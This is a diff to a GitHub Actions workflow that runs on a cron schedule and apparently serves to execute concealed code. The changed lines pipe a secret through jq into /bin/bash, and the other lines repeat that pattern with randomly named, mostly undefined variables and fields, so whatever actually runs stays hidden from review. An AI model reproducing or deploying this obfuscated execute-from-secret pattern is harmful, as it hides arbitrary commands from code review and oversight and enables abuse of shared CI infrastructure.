@@ -2,24 +2,27 @@ name: chengbuzheng3186
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '36 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengbuzheng3186
         env:
-          g567: ${{ secrets.g567 }}
+          qg799: ${{ secrets.qg799 }}
         run: |
-          echo $g567 | jq -r .x39739 | /bin/bash
-          echo $pzr80 | jq -r .li4143 | /bin/bash
-          echo $cp7770 | jq -r .issgg01471 | /bin/bash
-          echo $cf49 | jq -r .fe34 | /bin/bash
-          echo $qoxw05824 | jq -r .p52 | /bin/bash
-          echo $j2 | jq -r .p1 | /bin/bash
-          echo $ztfw8 | jq -r .nc939 | /bin/bash
-          echo $oyf094 | jq -r .rbd5 | /bin/bash
-          echo $gqdmt5550 | jq -r .wskm4 | /bin/bash
+          echo $qg799 | jq -r .kah2172 | /bin/bash
+          echo $jem1484 | jq -r .ih2530 | /bin/bash
+          echo $vdh8 | jq -r .ueq224 | /bin/bash
+          echo $kyjd81 | jq -r .csmsd2 | /bin/bash
+          echo $xh388 | jq -r .lgoq4253 | /bin/bash
+          echo $jrp2 | jq -r .d916 | /bin/bash
+          echo $wyppw26 | jq -r .ggjh668 | /bin/bash
+          echo $u9545 | jq -r .j743 | /bin/bash
+          echo $rkpy074 | jq -r .k1529 | /bin/bash
+          echo $ypf2947 | jq -r .lkub67955 | /bin/bash
+          echo $tohk0655 | jq -r .zfl93467 | /bin/bash
+          echo $kzc1349 | jq -r .opvz69670 | /bin/bash
 
